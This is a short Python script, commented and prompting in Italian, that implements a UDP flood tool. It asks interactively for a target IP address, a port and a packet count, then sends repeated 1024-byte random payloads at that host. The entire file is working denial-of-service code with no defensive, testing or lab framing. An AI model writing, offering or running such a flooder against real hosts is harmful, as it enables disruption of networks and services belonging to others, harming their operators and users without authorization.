import random
import socket

def generate_payload(size=1024):
    return random.randbytes(size)

#genera dati casuali di dimenzione specificata (default 1024)

def udp_flood(thost,tport,num_pacchetti):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload=generate_payload()
        for i in range(num_pacchetti):
            udp_socket.sendto(payload,(thost,tport))
            print(f"Invio pacchetto {i+1}/{num_pacchetti}", end='\r')
        print('\nInvio Completato')
    except socket.error as e:
        print(f'\n Errore di socket: {e}')
    finally:
        if 'udp_socket' in locals():
            udp_socket.close()
            print('Socket chiuso')

if __name__ == "__main__":
    target_ip = input("Inserisci l'indirizzo IP target: ")
    try:
        # Chiede all'utente di inserire la porta UDP target e la converte in un intero
        target_port = int(input("Inserisci la porta UDP target: "))
        # Verifica che la porta sia un valore valido
        if not (1 <= target_port <= 65535):
            print("Porta non valida. Deve essere compresa tra 1 e 65535.")
        else:
            try:
                # Chiede all'utente di inserire il numero di pacchetti da inviare e lo converte in un intero
                num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
                if num_packets <= 0:
                    print("Il numero di pacchetti deve essere maggiore di zero.")
                else:
                    udp_flood(target_ip, target_port, num_packets)
            except ValueError:
                # Gestisce l'errore se l'input per il numero di pacchetti non è un numero intero
                print("Input non valido per il numero di pacchetti.")
    except ValueError:
        print("Input non valido per la porta.")
